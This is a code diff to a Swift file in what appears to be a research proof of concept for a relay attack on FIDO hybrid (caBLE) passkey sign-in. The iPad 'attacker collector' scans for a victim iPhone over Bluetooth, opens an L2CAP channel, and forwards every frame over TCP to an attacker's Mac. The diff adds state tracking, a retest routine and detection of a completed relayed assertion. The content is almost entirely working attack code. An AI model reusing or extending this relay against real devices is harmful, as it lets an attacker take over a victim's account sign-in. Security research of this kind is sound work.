@@ -2,20 +2,6 @@
 //  CollectorCentral.swift
 //  cable-relay-poc — ATTACKER COLLECTOR role (runs on the iPad)
 //
-//  The iPad sits ~1 m from the victim iPhone. It is a BLE central AND a
-//  TCP client to the Mac. It performs NO crypto of its own: it opens the
-//  L2CAP channel to the phone, then becomes a dumb bidirectional pump —
-//  every frame from the phone goes to the Mac over TCP, every frame from
-//  the Mac goes to the phone over L2CAP.
-//
-//  This is the relay. Note what is absent: no key, no Noise state, no
-//  parsing of message bodies. It cannot read the traffic (it does not hold
-//  the keys). It does not need to. That is the entire thesis — relay needs
-//  no cryptographic break.
-//
-//  The TCP leg models FIDO's generic tunnel server: a public encrypted
-//  byte-bridge that will carry whatever you put on it.
-//
 
 import Foundation
 import CoreBluetooth
@@ -25,8 +11,19 @@ final class CollectorCentral: NSObject, ObservableObject {
 
     @Published var log: [String] = []
     @Published var relaying = false
+    @Published var framesRelayed = 0
+    @Published var ceremonyState: CeremonyState = .idle
 
-    // --- config: where the Mac relay-browser's TCP bridge listens ---
+    enum CeremonyState: Equatable {
+        case idle
+        case scanning
+        case bleConnected
+        case l2capOpen
+        case relayActive
+        case ceremonyComplete
+        case failed(String)
+    }
+
     var bridgeHost: String = "192.168.1.50"
     var bridgePort: UInt16 = 7070
 
@@ -45,6 +42,37 @@ final class CollectorCentral: NSObject, ObservableObject {
     func start() {
         manager = CBCentralManager(delegate: self, queue: .main)
         connectBridge()
+    }
+
+    func retest() {
+        line("--- RETEST: resetting for new ceremony ---")
+        channel?.inputStream.close()
+        channel?.outputStream.close()
+        channel = nil
+        l2capReady = false
+        l2capIn = Data()
+        pendingToPhone = []
+        framesRelayed = 0
+
+        tcp?.cancel()
+        tcp = nil
+        tcpIn = Data()
+        tcpReady = false
+
+        if let p = phone {
+            manager.cancelPeripheralConnection(p)
+        }
+        phone = nil
+        psmChar = nil
+        relaying = false
+        ceremonyState = .idle
+
+        connectBridge()
+        if manager.state == .poweredOn {
+            manager.scanForPeripherals(withServices: [CBUUID(string: BLEIDs.serviceUUID)])
+            ceremonyState = .scanning
+            line("re-scanning for victim phone")
+        }
     }
 
     private func line(_ s: String) {
@@ -95,6 +123,8 @@ final class CollectorCentral: NSObject, ObservableObject {
         tcp?.send(content: Frame.encode(frame), completion: .contentProcessed { [weak self] err in
             if let err { self?.line("TCP send error: \(err)") }
         })
+        DispatchQueue.main.async { self.framesRelayed += 1 }
+        checkCeremonyProgress(frame)
     }
 
     private func toPhone(_ frame: Data) {
@@ -108,6 +138,18 @@ final class CollectorCentral: NSObject, ObservableObject {
                                                   maxLength: wire.count) }
         if n < 0 {
             line("toPhone: write error \(out.streamError?.localizedDescription ?? "unknown")")
+        }
+        DispatchQueue.main.async { self.framesRelayed += 1 }
+        checkCeremonyProgress(frame)
+    }
+
+    private func checkCeremonyProgress(_ frame: Data) {
+        guard let msg = Message.decode(frame) else { return }
+        if msg.type == .assertionResponse {
+            DispatchQueue.main.async {
+                self.ceremonyState = .ceremonyComplete
+                self.line("RELAY CEREMONY COMPLETE — all frames forwarded")
+            }
         }
     }
 
@@ -126,6 +168,7 @@ extension CollectorCentral: CBCentralManagerDelegate, CBPeripheralDelegate {
     func centralManagerDidUpdateState(_ c: CBCentralManager) {
         guard c.state == .poweredOn else { line("BLE state \(c.state.rawValue)"); return }
         c.scanForPeripherals(withServices: [CBUUID(string: BLEIDs.serviceUUID)])
+        ceremonyState = .scanning
         line("scanning for victim phone")
     }
 
@@ -139,12 +182,14 @@ extension CollectorCentral: CBCentralManagerDelegate, CBPeripheralDelegate {
     }
 
     func centralManager(_ c: CBCentralManager, didConnect p: CBPeripheral) {
+        ceremonyState = .bleConnected
         line("connected; discovering service")
         p.discoverServices([CBUUID(string: BLEIDs.serviceUUID)])
     }
 
     func centralManager(_ c: CBCentralManager, didFailToConnect p: CBPeripheral, error: Error?) {
         line("failed to connect: \(error?.localizedDescription ?? "unknown")")
+        ceremonyState = .failed("BLE connect failed")
     }
 
     func peripheral(_ p: CBPeripheral, didDiscoverServices error: Error?) {
@@ -182,6 +227,7 @@ extension CollectorCentral: CBCentralManagerDelegate, CBPeripheralDelegate {
         ch.outputStream.open()
         l2capReady = true
         relaying = true
+        ceremonyState = .relayActive
         line("L2CAP open — RELAY ACTIVE (phone<->iPad radio, iPad<->Mac TCP)")
         flushPendingToPhone()
     }
